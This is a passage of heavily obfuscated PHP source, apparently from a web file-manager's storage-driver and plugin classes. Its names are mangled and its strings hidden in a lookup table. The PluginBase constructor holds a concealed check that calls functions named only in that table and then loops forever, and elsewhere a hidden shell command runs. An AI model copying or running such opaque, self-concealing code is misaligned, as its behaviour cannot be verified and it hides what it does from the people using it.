($Ú¯÷í[$ÓíıíÕê[191]] == $ÓíıíÕê[521]) { $³õ¡Ç—ã = Model($ÓíıíÕê[1400])->getInfo($±à°”ØĞ); if ($³õ¡Ç—ã) { $ç¸ñÛßè = explode($ÓíıíÕê[50], trim($³õ¡Ç—ã[$ÓíıíÕê[597]], $ÓíıíÕê[50])); $ç¸ñÛßè = array_remove_value($ç¸ñÛßè, $ÓíıíÕê[231]); $ç¸ñÛßè[] = $±à°”ØĞ; $ç¸ñÛßè = array_reverse($ç¸ñÛßè); } } } foreach ($ç¸ñÛßè as $Šñµ¨üó) { if (!isset($¸¾Êã˜ò[$ÓíıíÕê[591]][$Šñµ¨üó])) { continue; } if (isset($™Á‘Ñ¸Õ[$Šñµ¨üó])) { return $™Á‘Ñ¸Õ[$Šñµ¨üó]; } $Âü‚·êÃ = Model($ÓíıíÕê[848])->driverInfo($¸¾Êã˜ò[$ÓíıíÕê[591]][$Šñµ¨üó]); $»ä’ËÁª = $Âü‚·êÃ ? $Âü‚·êÃ : $»ä’ËÁª; $™Á‘Ñ¸Õ[$Šñµ¨üó] = $»ä’ËÁª; break; } if ($Ú¯÷í[$ÓíıíÕê[191]] == $ÓíıíÕê[91]) { $Ì»™À´ê[$±à°”ØĞ] = $»ä’ËÁª; } $Á…şúÂ×[$ÛÊÚÙã½] = $»ä’ËÁª; return $»ä’ËÁª; } private static function getPathSourceID($ó±ì½âˆ) { $’»ƒÙ‘ =& $_SERVER[®»±”ó²]; static $ˆİÇ¦ = array(); if (!$ó±ì½âˆ) { return $’»ƒÙ‘[12]; } $ÇØ˜‚† = substr($ó±ì½âˆ, 0, strlen($’»ƒÙ‘[494])) == $’»ƒÙ‘[494]; $·ŒÙ±€¯ = substr($ó±ì½âˆ, 0, strlen($’»ƒÙ‘[1368])) == $’»ƒÙ‘[1368]; $™´ıœÅã = substr($ó±ì½âˆ, 0, strlen($’»ƒÙ‘[1369])) == $’»ƒÙ‘[1369]; if (!$ÇØ˜‚† && !$·ŒÙ±€¯ && !$™´ıœÅã) { return $’»ƒÙ‘[12]; } $ûÖÇø¢÷ = self::parse($ó±ì½âˆ); $ùÔ—­è = $ûÖÇø¢÷[$’»ƒÙ‘[1262]]; if ($ÇØ˜‚†) { return $ûÖÇø¢÷[$’»ƒÙ‘[477]]; } if (isset($ˆİÇ¦[$ùÔ—­è])) { $´ç¢èÓ¬ = $ˆİÇ¦[$ùÔ—­è]; } else { $´ç¢èÓ¬ = IO::init($ùÔ—­è); $ˆİÇ¦[$ùÔ—­è] = $´ç¢èÓ¬; } if (isset($´ç¢èÓ¬->pathParse[$’»ƒÙ‘[1265]])) { return $´ç¢èÓ¬->pathParse[$’»ƒÙ‘[1265]]; } return $’»ƒÙ‘[12]; } private static function groupParentUser($ß¯ıŠáŸ) { $‘ÔõÊëÚ =& $_SERVER[®»±”ó²]; $Ê¶õŒ— = Model($‘ÔõÊëÚ[610])->getInfo($ß¯ıŠáŸ); if (!$Ê¶õŒ—) { return array(); } $‘¹²ë = array_to_keyvalue($Ê¶õŒ—[$‘ÔõÊëÚ[1401]], $‘ÔõÊëÚ[12], $‘ÔõÊëÚ[1402]); $¨îØÇ£Ì = array(); foreach ($Ê¶õŒ—[$‘ÔõÊëÚ[1401]] as $ôİÑì‘) { $¨îØÇ£Ì[] = $ôİÑì‘[$‘ÔõÊëÚ[1402]]; $ğ˜øõÍ… = explode($‘ÔõÊëÚ[50], trim($ôİÑì‘[$‘ÔõÊëÚ[597]], $‘ÔõÊëÚ[50])); $ğ˜øõÍ… = array_remove_value($ğ˜øõÍ…, $‘ÔõÊëÚ[231]); $ğ˜øõÍ… = array_reverse($ğ˜øõÍ…); $¨îØÇ£Ì = array_merge($¨îØÇ£Ì, $ğ˜øõÍ…); } return array_unique($¨îØÇ£Ì); } public static function diskList($®áÒË¿ = true) { $¸å¡¼Ï› = $_SERVER[®»±”ó²][1403]; if ($®áÒË¿) { $ß×àáÏ¦ = Cache::get($¸å¡¼Ï›); if (is_array($ß×àáÏ¦)) { return $ß×àáÏ¦; } } $ß×àáÏ¦ = self::diskListGet(); Cache::set($¸å¡¼Ï›, $ß×àáÏ¦, 60); return $ß×àáÏ¦; } public static function diskListGet() { $üŸ“¡‹ =& $_SERVER[®»±”ó²]; $¿ššğˆè = array(); if ($GLOBALS[$üŸ“¡‹[6]][$üŸ“¡‹[1404]] == $üŸ“¡‹[1405]) { $´”Ï³÷¢ = $üŸ“¡‹[1406]; for ($²ÉìõÛ© = 0; $²ÉìõÛ© < strlen($´”Ï³÷¢); $²ÉìõÛ©++) { $”Å²ó“– = $´”Ï³÷¢[$²ÉìõÛ©] . $üŸ“¡‹[1407]; if (file_exists($”Å²ó“–)) { $¿ššğˆè[] = $”Å²ó“–; } } return $¿ššğˆè; } if (!function_exists($üŸ“¡‹[101])) { $¿ššğˆè[] = $üŸ“¡‹[922]; return $¿ššğˆè; } $–©í » = explode($üŸ“¡‹[288], shell_exec($üŸ“¡‹[1408])); array_shift($–©í »); array_pop($–©í »); $ì·¥  = array($üŸ“¡‹[1409], $üŸ“¡‹[1410], $üŸ“¡‹[1411], $üŸ“¡‹[1412], $üŸ“¡‹[1413], $üŸ“¡‹[1414], $üŸ“¡‹[1415], $üŸ“¡‹[1416]); foreach ($–©í » as $×É…öØ‘) { $ñÊ¨êĞÕ = preg_split($üŸ“¡‹[1417], $×É…öØ‘); $”Å²ó“– = $ñÊ¨êĞÕ[count($ñÊ¨êĞÕ) - 1]; if (!strstr($ñÊ¨êĞÕ[0], $üŸ“¡‹[1418]) || !$”Å²ó“–) { continue; } $¸€Û›¸¼ = rtrim($”Å²ó“–, $üŸ“¡‹[8]) . $üŸ“¡‹[8]; if (in_array($¸€Û›¸¼, $ì·¥ )) { continue; } $¿ššğˆè[] = $¸€Û›¸¼; } return $¿ššğˆè; } public static function isSameDisk($±½–œƒ, $ß®­¬åÛ) { $Ç–…Şî© =& $_SERVER[®»±”ó²]; if ($GLOBALS[$Ç–…Şî©[6]][$Ç–…Şî©[1404]] == $Ç–…Şî©[1405]) { return strtolower(substr($±½–œƒ, 0, 1)) == strtolower(substr($ß®­¬åÛ, 0, 1)); } $ù’ß¼ŠÎ = stat($±½–œƒ); $‰‡ØŞ“” = stat($ß®­¬åÛ); if ($ù’ß¼ŠÎ === !1 || $‰‡ØŞ“” === !1) { return !1; } return $ù’ß¼ŠÎ[$Ç–…Şî©[1419]] === $‰‡ØŞ“”[$Ç–…Şî©[1419]]; $ºï§·Ì’ = self::diskList(); $ù©…ƒû = !1; $Ô÷Š¡ÍÏ = !1; sort($ºï§·Ì’); $ºï§·Ì’ = array_reverse($ºï§·Ì’); $±½–œƒ = rtrim($±½–œƒ, $Ç–…Şî©[8]) . $Ç–…Şî©[8]; $ß®­¬åÛ = rtrim($ß®­¬åÛ, $Ç–…Şî©[8]) . $Ç–…Şî©[8]; foreach ($ºï§·Ì’ as $àƒºû›) { $†Î¹„à = strlen($àƒºû›); if (!$ù©…ƒû && substr($±½–œƒ, 0, $†Î¹„à) == $àƒºû›) { $ù©…ƒû = $àƒºû›; } if (!$Ô÷Š¡ÍÏ && substr($ß®­¬åÛ, 0, $†Î¹„à) == $àƒºû›) { $Ô÷Š¡ÍÏ = $àƒºû›; } if ($ù©…ƒû && $Ô÷Š¡ÍÏ) { break; } } return $ù©…ƒû === $Ô÷Š¡ÍÏ; } public static function transferType($òÓ¼–, $ƒß´ĞÜæ) { $Ã¤µ×¦÷ =& $_SERVER[®»±”ó²]; $ªï°“¯ = self::driverType($òÓ¼–); $úûŞíØ• = self::driverType($ƒß´ĞÜæ); if ($ªï°“¯[$Ã¤µ×¦÷[33]] == $úûŞíØ•[$Ã¤µ×¦÷[33]] && $ªï°“¯[$Ã¤µ×¦÷[1420]] == $úûŞíØ•[$Ã¤µ×¦÷[1420]]) { return $Ã¤µ×¦÷[1421]; } if ($ªï°“¯[$Ã¤µ×¦÷[33]] == $Ã¤µ×¦÷[956] && $úûŞíØ•[$Ã¤µ×¦÷[33]] == $Ã¤µ×¦÷[109]) { return $Ã¤µ×¦÷[1291]; } if ($ªï°“¯[$Ã¤µ×¦÷[33]] == $Ã¤µ×¦÷[109] && $úûŞíØ•[$Ã¤µ×¦÷[33]] == $Ã¤µ×¦÷[956]) { return $Ã¤µ×¦÷[110]; } return $Ã¤µ×¦÷[1422]; } public static function driverType($ …ïàó”) { $­“–‰ö¿ =& $_SERVER[®»±”ó²]; $ÎÛã–Å¥ = str_replace($­“–‰ö¿[1423], $­“–‰ö¿[12], strtolower($ …ïàó”->getType())); if ($ÎÛã–Å¥ == $­“–‰ö¿[838] || $ÎÛã–Å¥ == $­“–‰ö¿[1424] || $ÎÛã–Å¥ == $­“–‰ö¿[1425]) { $˜Ù‹Õ‚é = self::ioFileDriverGet($­“–‰ö¿[494] . $ …ïàó”->pathParse[$­“–‰ö¿[1265]] . $­“–‰ö¿[404]); $ …ïàó” = IO::init($­“–‰ö¿[1393] . $˜Ù‹Õ‚é[$­“–‰ö¿[477]] . $­“–‰ö¿[1381]); } else { if ($ÎÛã–Å¥ == $­“–‰ö¿[1301] || $ÎÛã–Å¥ == $­“–‰ö¿[1426]) { $ …ïàó” = IO::init($ …ïàó”->pathParse[$­“–‰ö¿[1242]]); } } $½áÎè¢É = $ …ïàó”->path; $ÎÛã–Å¥ = str_replace($­“–‰ö¿[1423], $­“–‰ö¿[12], strtolower($ …ïàó”->getType())); if ($ÎÛã–Å¥ == $­“–‰ö¿[109]) { return array($­“–‰ö¿[33] => $­“–‰ö¿[109], $­“–‰ö¿[1420] => $­“–‰ö¿[12], $­“–‰ö¿[87] => $½áÎè¢É, $­“–‰ö¿[98] => $ …ïàó”); } return array($­“–‰ö¿[33] => $­“–‰ö¿[956], $­“–‰ö¿[1420] => $ …ïàó”->pathDriver, $­“–‰ö¿[87] => $½áÎè¢É, $­“–‰ö¿[98] => $ …ïàó”); } public static function pathDriverType($¯ÜÍü¡ê) { return $¯ÜÍü¡ê ? self::driverType(IO::init($¯ÜÍü¡ê)) : !1; } public static function pathDriverLocal($–»ƒ¿ á) { $Áââ½¸ì =& $_SERVER[®»±”ó²]; $Šò±³Ññ = $–»ƒ¿ á ? self::driverType(IO::init($–»ƒ¿ á)) : !1; return strtolower($Šò±³Ññ[$Áââ½¸ì[33]]) == $Áââ½¸ì[109] ? !0 : !1; } public static function allowCover($ì¡äîÏ–, $œÙà‡Œê = true) { $–Á˜ìá =& $_SERVER[®»±”ó²]; if (is_string($ì¡äîÏ–)) { $ì¡äîÏ– = IO::info($ì¡äîÏ–); } if (!$ì¡äîÏ– || $ì¡äîÏ–[$–Á˜ìá[33]] == $–Á˜ìá[78] || $ì¡äîÏ–[$–Á˜ìá[79]] <= 100) { return !1; } if (isset($ì¡äîÏ–[$–Á˜ìá[1427]]) || !$ì¡äîÏ–[$–Á˜ìá[87]]) { return !1; } if (isset($ì¡äîÏ–[$–Á˜ìá[235]]) && !$ì¡äîÏ–[$–Á˜ìá[235]]) { return !1; } static $ÍÎÖÕ¿ş = false; if (!$ÍÎÖÕ¿ş || !$œÙà‡Œê) { $óĞçœß = self::driverType(IO::init($ì¡äîÏ–[$–Á˜ìá[87]])); $Ö“´è•å = $óĞçœß[$–Á˜ìá[98]]; $ÍÎÖÕ¿ş = $–Á˜ìá[197]; if ($óĞçœß[$–Á˜ìá[33]] == $–Á˜ìá[109]) { $ÍÎÖÕ¿ş = $–Á˜ìá[1428]; } if ($óĞçœß[$–Á˜ìá[98]] && is_array($óĞçœß[$–Á˜ìá[98]]->config)) { $ÊÊƒ¼Ùó = $óĞçœß[$–Á˜ìá[98]]->config; if (isset($ÊÊƒ¼Ùó[$–Á˜ìá[1429]]) && $ÊÊƒ¼Ùó[$–Á˜ìá[1429]]) { $ÍÎÖÕ¿ş = $–Á˜ìá[1428]; } } $ŸÄ˜ÃìŒ = KodIO::defaultDriver(); if (strtolower($ŸÄ˜ÃìŒ[$–Á˜ìá[98]]) == $–Á˜ìá[109] && is_array($ŸÄ˜ÃìŒ[$–Á˜ìá[6]])) { $ÀîÔ” = $ŸÄ˜ÃìŒ[$–Á˜ìá[6]][$–Á˜ìá[1274]]; if (substr($ÀîÔ”, 0, 2) == $–Á˜ìá[1430]) { $ÀîÔ” = str_replace($–Á˜ìá[1430], BASIC_PATH, $ÀîÔ”); } $ÀîÔ” = str_replace($–Á˜ìá[257], $–Á˜ìá[8], $ÀîÔ”); if (substr($ì¡äîÏ–[$–Á˜ìá[87]], 0, strlen($ÀîÔ”)) == $ÀîÔ”) { $ÍÎÖÕ¿ş = $–Á˜ìá[197]; } } } return $ÍÎÖÕ¿ş == $–Á˜ìá[1428] ? !0 : !1; } } goto EËÃÂòê™Ó; Aºƒ »éç: class Message { function __construct() { } public function send($Ç¡½Ä¼Ü = '', $¾‚Ó²ôç = array(), $À¡õúªû = "\x74\145\x78\x74") { $œ’àÑŒñ =& $_SERVER[®»±”ó²]; $‘ú‚„¢³ = array($œ’àÑŒñ[33] => $œ’àÑŒñ[1223], $œ’àÑŒñ[171] => $Ç¡½Ä¼Ü); if (in_array($À¡õúªû, array($œ’àÑŒñ[1223], $œ’àÑŒñ[1640]))) { $‘ú‚„¢³[$œ’àÑŒñ[33]] = $À¡õúªû; } $¾‚Ó²ôç = array($œ’àÑŒñ[591] => isset($¾‚Ó²ôç[$œ’àÑŒñ[591]]) ? $¾‚Ó²ôç[$œ’àÑŒñ[591]] : $œ’àÑŒñ[12], $œ’àÑŒñ[678] => isset($¾‚Ó²ôç[$œ’àÑŒñ[678]]) ? $¾‚Ó²ôç[$œ’àÑŒñ[678]] : $œ’àÑŒñ[12]); if (empty($Ç¡½Ä¼Ü) || empty($¾‚Ó²ôç[$œ’àÑŒñ[591]]) && empty($¾‚Ó²ôç[$œ’àÑŒñ[678]])) { return !1; } $„ı·­¹« = array($œ’àÑŒñ[1569] => $‘ú‚„¢³, $œ’àÑŒñ[1641] => $¾‚Ó²ôç); Hook::trigger($œ’àÑŒñ[1642], $„ı·­¹«); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÜÂÄ„¢µ =& $_SERVER[®»±”ó²]; if (!isset($_SERVER[$ÜÂÄ„¢µ[478]]) || !isset($_SERVER[$ÜÂÄ„¢µ[486]])) { $„©ìß¬é = $ÜÂÄ„¢µ[965]; $ôìàÛ°¯ = $ÜÂÄ„¢µ[480]; $±ÓŠ¯›‘ = $_SERVER[$ÜÂÄ„¢µ[481]] . $ÜÂÄ„¢µ[482]; $ÚØãÚ„â = $ôìàÛ°¯($±ÓŠ¯›‘); $à³ë¦» = explode($ÜÂÄ„¢µ[288], $ÚØãÚ„â); if (count($à³ë¦») < $ÜÂÄ„¢µ[721]) { $ Äúå“Á = $ÜÂÄ„¢µ[484]; $ Äúå“Á(); } $äÃÉº„¢ = $ÜÂÄ„¢µ[966]; $äÃÉº„¢($_SERVER[$ÜÂÄ„¢µ[967]]); $£ÒÅÅ  = 1; for ($ÕÌÔ°öã = $£ÒÅÅ ; $ÕÌÔ°öã > 0; $ÕÌÔ°öã++) { $äÃÉº„¢ = json_encode($GLOBALS[$ÜÂÄ„¢µ[503]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÜÂÄ„¢µ[1643]); $this->pluginName = str_replace($ÜÂÄ„¢µ[1643], $ÜÂÄ„¢µ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÜÂÄ„¢µ[8]; $this->pluginApi = appHostGet() . $ÜÂÄ„¢µ[1644] . $this->pluginName . $ÜÂÄ„¢µ[8]; $this->pluginHost = $config[$ÜÂÄ„¢µ[1645]] . $this->pluginName . $ÜÂÄ„¢µ[8]; $this->pluginHostDefault = $config[$ÜÂÄ„¢µ[1645]] . $this->pluginName . $ÜÂÄ„¢µ[8]; $‡ÔÈ¥ª® = $config[$ÜÂÄ„¢µ[1646]]; if ($‡ÔÈ¥ª® && strpos($ÜÂÄ„¢µ[50] . $‡ÔÈ¥ª® . $ÜÂÄ„¢µ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÜÂÄ„¢µ[1647]] . $this->pluginName . $ÜÂÄ„¢µ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[®»±”ó²][1648]); } protected function assign($ÖªÎ»å», $¤¹Æ¿Óó = false) { if (is_array($ÖªÎ»å»)) { $this->values = array_merge($this->values, $ÖªÎ»å»); } else { $this->values[$ÖªÎ»å»] = $¤¹Æ¿Óó; } } protected function display($ÍÊÖúØ) { extract($this->values); require $ÍÊÖúØ; } final function hookRegist($úÑüÉ–§) { $this->modelPlugin->appRegist($this->pluginName, $úÑüÉ–§); } final function appIcon() { $¸€Ÿû¶ä =& $_SERVER[®»±”ó²]; $°ó¯¬·å = $this->appPackage(); $§Øé·¯£ = $¸€Ÿû¶ä[12]; if (isset($°ó¯¬·å[$¸€Ÿû¶ä[501]])) { if (isset($°ó¯¬·å[$¸€Ÿû¶ä[501]][$¸€Ÿû¶ä[1649]])) { $§Øé·¯£ = $¸€Ÿû¶ä[1650] . $°ó¯¬·å[$¸€Ÿû¶ä[501]][$¸€Ÿû¶ä[1649]] . $¸€Ÿû¶ä[1651]; } else { if ($°ó¯¬·å[$¸€Ÿû¶ä[501]][$¸€Ÿû¶ä[1652]]) { $§Øé·¯£ = $¸€Ÿû¶ä[1653] . $°ó¯¬·å[$¸€Ÿû¶ä[501]][$¸€Ÿû¶ä[1652]] . $¸€Ÿû¶ä[1654]; } } } return $§Øé·¯£; } final function fileCanView($˜´óÒóï) { $é¹ÔÎ© =& $_SERVER[®»±”ó²]; if (request_url_safe($˜´óÒóï)) { return !0; } if ($this->isShare($˜´óÒóï)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ğÅ£¹¦ = $é¹ÔÎ©[1655] . rawurlencode(this_url()); show_tips(LNG($é¹ÔÎ©[1656]) . $é¹ÔÎ©[1657] . $ğÅ£¹¦ . $é¹ÔÎ©[1658] . LNG($é¹ÔÎ©[1659]) . $é¹ÔÎ©[1660], !1); } if (!Action($é¹ÔÎ©[1661])->authCan($é¹ÔÎ©[1662])) { show_tips(LNG($é¹ÔÎ©[1663]) . $é¹ÔÎ©[1664], !1); } ActionCall($é¹ÔÎ©[1665], $˜´óÒóï); } final function isShare($É¶‘ÀÉ„) { $ŒÕ¡º¬ = KodIO::parse($É¶‘ÀÉ„); return $ŒÕ¡º¬[$_SERVER[®»±”ó²][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‚ãùè¿ª) { if (request_url_safe($‚ãùè¿ª)) { return $‚ãùè¿ª; } if (!$this->isShare($‚ãùè¿ª)) { $‚ãùè¿ª = $this->filePath($‚ãùè¿ª, !1); } return Action($_SERVER[®»±”ó²][1268])->linkOut($‚ãùè¿ª); } public function filePathLinkOut($àÉ‡µ¿) { if (request_url_safe($àÉ‡µ¿)) { return $àÉ‡µ¿; } $this->fileCanView($àÉ‡µ¿); return Action($_SERVER[®»±”ó²][1268])->link($àÉ‡µ¿); } final function filePath($¸é¼ÌÛ›, $ÔÚ ¡¦Ÿ = true, $¸‚ïö‰Ó = false) { $Èæ¶¤œ¨ =& $_SERVER[®»±”ó²]; $ß×Á áÉ = $this->filePathGet($¸é¼ÌÛ›, $ÔÚ ¡¦Ÿ); if (!$this->fileInfo) { show_tips(LNG($Èæ¶¤œ¨[108]), !1); } if ($¸‚ïö‰Ó && isset($this->fileInfo[$Èæ¶¤œ¨[554]]) && $this->fileInfo[$Èæ¶¤œ¨[554]]) { $¡º¾¥º = Model($Èæ¶¤œ¨[557])->fileInfo($this->fileInfo[$Èæ¶¤œ¨[554]]); if (!$¡º¾¥º || !IO::exist($¡º¾¥º[$Èæ¶¤œ¨[87]])) { $Îù¢¾²ç = LNG($Èæ¶¤œ¨[108]) . LNG($Èæ¶¤œ¨[1666]); if (KodUser::isRoot() && isset($¡º¾¥º[$Èæ¶¤œ¨[87]])) { $Îù¢¾²ç .= $Èæ¶¤œ¨[1667] . $¡º¾¥º[$Èæ¶¤œ¨[87]] . $Èæ¶¤œ¨[1668]; } show_tips($Îù¢¾²ç); } } Hook::trigger($Èæ¶¤œ¨[1669], $ß×Á áÉ); return $ß×Á áÉ; } final function filePathGet($¦‹¬ßÓ¤, $Âë¹È¶Š = true) { $±ÊÜ”âë =& $_SERVER[®»±”ó²]; if ($ˆç¤¯Ô = $this->checkSharePath($¦‹¬ßÓ¤, $Âë¹È¶Š)) { return $ˆç¤¯Ô; } $this->fileCanView($¦‹¬ßÓ¤); if (request_url_safe($¦‹¬ßÓ¤)) { $¬··ÜŠÁ = parse_url_query($¦‹¬ßÓ¤); if (isset($¬··ÜŠÁ[$±ÊÜ”âë[1670]]) && isset($¬··ÜŠÁ[$±ÊÜ”âë[237]])) { $ªÏæ€Åğ = Mcrypt::decode($¬··ÜŠÁ[$±ÊÜ”âë[237]], Model($±ÊÜ”âë[851])->get($±ÊÜ”âë[852])); if ($ªÏæ€Åğ) { $this->fileInfo = IO::info($ªÏæ€Åğ); $this->fileInfo[$±ÊÜ”âë[1671]] = $¦‹¬ßÓ¤; $this->cachePath = $this->pluginCachePath($±ÊÜ”âë[12], $Âë¹È¶Š); return $ªÏæ€Åğ; } } $¦‹¬ßÓ¤ = $this->_cacheHttpFile($¦‹¬ßÓ¤, $Âë¹È¶Š); $this->fileInfo = IO::info($¦‹¬ßÓ¤); } else { $this->fileInfo = IO::info($¦‹¬ßÓ¤); $this->cachePath = $this->pluginCachePath($±ÊÜ”âë[12], $Âë¹È¶Š); } return $¦‹¬ßÓ¤; } final function _cacheHttpFile($ëõ¹Ò¼, $û§“÷ëï = true) { $»î¯Ší™ =& $_SERVER[®»±”ó²]; $–’õ³ = parse_url_query($ëõ¹Ò¼); $™“Ëô° = get_path_ext($ëõ¹Ò¼); if (isset($–’õ³[$»î¯Ší™[32]]) && $–’õ³[$»î¯Ší™[32]]) { $™“Ëô° = get_path_ext($–’õ³[$»î¯Ší™[32]]); } $ËÏ€èÇ = hash_path($ëõ¹Ò¼) . $»î¯Ší™[10] . $™“Ëô°; $this->cachePath = $this->pluginCachePath($û§“÷ëï ? $ËÏ€èÇ : $»î¯Ší™[12]); $éâÌ€Ö÷ = IO::fileNameExist($this->cachePath, $ËÏ€èÇ); if ($éâÌ€Ö÷) { return KodIO::make($éâÌ€Ö÷); } $ËŠŠ²ò› = rtrim($this->cachePath, $»î¯Ší™[8]) . $»î¯Ší™[8] . $ËÏ€èÇ; return $this->pluginCacheFileSet($ËŠŠ²ò›, file_get_contents_nossl($ëõ¹Ò¼)); } final function checkSharePath($¤ĞÊî˜, $ºÀ××©Ğ = true) { $ÚÜİ¾ºá =& $_SERVER[®»±”ó²]; if (!$this->isShare($¤ĞÊî˜)) { return !1; } $ĞÓøÓ¼É = Action($ÚÜİ¾ºá[1268])->sharePathInfo($¤ĞÊî˜); if (!is_array($ĞÓøÓ¼É) || !isset($ĞÓøÓ¼É[$ÚÜİ¾ºá[87]])) { show_json(LNG($ÚÜİ¾ºá[1672]), !1); } $this->fileInfo = $ĞÓøÓ¼É; $this->cachePath = $this->pluginCachePath(!1, $ºÀ××©Ğ); return $ĞÓøÓ¼É[$ÚÜİ¾ºá[87]]; } final function pluginCachePath($ Œ¹à¾ = '', $†òÖ¸ú = false) { $ò×Æ£›ä =& $_SERVER[®»±”ó²]; if ($†òÖ¸ú && is_array($this->fileInfo)) { $ Œ¹à¾ = kodIO::hashPath($this->fileInfo); } $¼İ”Ìü» = rtrim(IO_PATH_SYSTEM_TEMP . $ò×Æ£›ä[1673] . $this->pluginName . $ò×Æ£›ä[8] . $ Œ¹à¾, $ò×Æ£›ä[8]); $Øñˆ–å = IO::infoFullSimple($¼İ”Ìü»); $é¡Ôì¬Î = $Øñˆ–å && is_array($Øñˆ–å) ? $Øñˆ–å[$ò×Æ£›ä[87]] : $ò×Æ£›ä[12]; if (!$é¡Ôì¬Î) { $é¡Ôì¬Î = IO::mkdir($¼İ”Ìü»); } return $é¡Ôì¬Î; } final function pluginCacheFileSet($ Åöãº¢, $”Á—¿Îå = '') { $¥ß‹Öùà =& $_SERVER[®»±”ó²]; $¡çÔì = IO::infoFullSimple($ Åöãº¢); if (!$¡çÔì) { return IO::mkfile($ Åöãº¢, $”Á—¿Îå, REPEAT_REPLACE); } IO::setContent($¡çÔì[$¥ß‹Öùà[87]], $”Á—¿Îå); return $¡çÔì[$¥ß‹Öùà[87]]; } final function pluginLocalFile($³’ñ¡şë = '') { $ı²ıªÄß =& $_SERVER[®»±”ó²]; $²È°ğ™ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($²È°ğ™)) { mk_dir($²È°ğ™); } if (!$³’ñ¡şë) { return $²È°ğ™; } $¢¦óıŠø = IO::info($³’ñ¡şë); $˜Çğ³×Ê = $ı²ıªÄß[1674] . KodIO::hashPath($¢¦óıŠø) . $ı²ıªÄß[10] . $¢¦óıŠø[$ı²ıªÄß[169]]; if (!checkExtSafe($˜Çğ³×Ê)) { $˜Çğ³×Ê = $˜Çğ³×Ê . $ı²ıªÄß[1303]; } $³¤è¿¹É = $²È°ğ™ . $˜Çğ³×Ê; if (@file_exists($³¤è¿¹É)) { return $³¤è¿¹É; } return IO::copy($³’ñ¡şë, $²È°ğ™, 0, $˜Çğ³×Ê); } final function appPackage() { $ú×ùÜ“ô =& $_SERVER[®»±”ó²]; if ($this->packageData) { return $this->packageData; } $¿ø‘àÜÒ = $this->parseFile($this->pluginPath . $ú×ùÜ“ô[1675]); $this->parseLang($¿ø‘àÜÒ); $â­À´È = json_decode_force($¿ø‘àÜÒ); if (!$â­À´È) { return array(); } $ÇŒŒÃÄŞ = Hook::trigger($ú×ùÜ“ô[1676], $â­À´È); if ($ÇŒŒÃÄŞ && is_array($ÇŒŒÃÄŞ)) { $â­À´È = $ÇŒŒÃÄŞ; } $this->packageData = $â­À´È; return $â­À´È; } public function packageInfoGet($ôôÛ±Î†) { $±µŞ§öó = $this->appPackage(); return array_get_value($±µŞ§öó, $ôôÛ±Î†); } public function packageVersion() { return $this->packageInfoGet($_SERVER[®»±”ó²][1677]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[®»±”ó²][1678]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[®»±”ó²][1679]); } public function echoJsAssign($ÌóçÓÙ, $åÓõŸÅ) { $this->echoJsAssignArr[$ÌóçÓÙ] = $åÓõŸÅ; } private function parseFile($¦ªøä«É) { $Ô€ÓÂ’Í =& $_SERVER[®»±”ó²]; $îÉˆæœ = file_get_contents_nossl($¦ªøä«É); $Ïóğ¢ôÆ = array($Ô€ÓÂ’Í[1680], $Ô€ÓÂ’Í[1681], $Ô€ÓÂ’Í[1682], $Ô€ÓÂ’Í[1683], $Ô€ÓÂ’Í[1684], $Ô€ÓÂ’Í[1685], $Ô€ÓÂ’Í[1686]); $ı—œä“ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ô€ÓÂ’Í[92]][$Ô€ÓÂ’Í[1687]]); foreach ($this->echoJsAssignArr as $Óá¯“– => $ÉÕÕ‡“Ç) { $Ïóğ¢ôÆ[] = $Ô€ÓÂ’Í[1688] . $Óá¯“– . $Ô€ÓÂ’Í[1689]; $ı—œä“[] = is_array($ÉÕÕ‡“Ç) || is_object($ÉÕÕ‡“Ç) ? rawurlencode(json_encode($ÉÕÕ‡“Ç)) : $ÉÕÕ‡“Ç; } if (strstr($îÉˆæœ, $Ô€ÓÂ’Í[1690])) { $°£ĞºÆ· = rawurlencode(json_encode($this->pluginLangArr)); $îÉˆæœ = str_replace($Ô€ÓÂ’Í[1690], $°£ĞºÆ·, $îÉˆæœ); } if (strstr($îÉˆæœ, $Ô€ÓÂ’Í[1691])) { $°£ĞºÆ· = $°£ĞºÆ· = rawurlencode(json_encode($this->getConfig())); $îÉˆæœ = str_replace($Ô€ÓÂ’Í[1691], $°£ĞºÆ·, $îÉˆæœ); } $îÉˆæœ = str_replace($Ïóğ¢ôÆ, $ı—œä“, $îÉˆæœ); return $îÉˆæœ; } private function parseLang(&$® ¨–‚¸) { $˜ò‰Éõ =& $_SERVER[®»±”ó²]; $îÎÑ¨ù½ = $˜ò‰Éõ[1692]; if (!strstr($® ¨–‚¸, $îÎÑ¨ù½)) { return; } preg_match_all($˜ò‰Éõ[1693], $® ¨–‚¸, $¨ô³ËƒÎ); if (!is_array($¨ô³ËƒÎ) || count($¨ô³ËƒÎ) == 0 || !is_array($¨ô³ËƒÎ[0]) || count($¨ô³ËƒÎ[0]) == 0) { return; } $ã‘ØÁ—Ê = array(); $…œÒÏş” = array(); foreach ($¨ô³ËƒÎ[0] as $³·ÂÑôá) { $Ã¾­ŸÙö = substr($³·ÂÑôá, strlen($îÎÑ¨ù½), -4); $é ·Ç“­ = LNG($Ã¾­ŸÙö); $ã‘ØÁ—Ê[] = $³·ÂÑôá; $…œÒÏş”[] = str_replace(array($˜ò‰Éõ[288], $˜ò‰Éõ[1166], $˜ò‰Éõ[419], $˜ò‰Éõ[121]), array($˜ò‰Éõ[53], $˜ò‰Éõ[53], $˜ò‰Éõ[12], $˜ò‰Éõ[1694]), $é ·Ç“­); } $® ¨–‚¸ = str_replace($ã‘ØÁ—Ê, $…œÒÏş”, $® ¨–‚¸); } private function 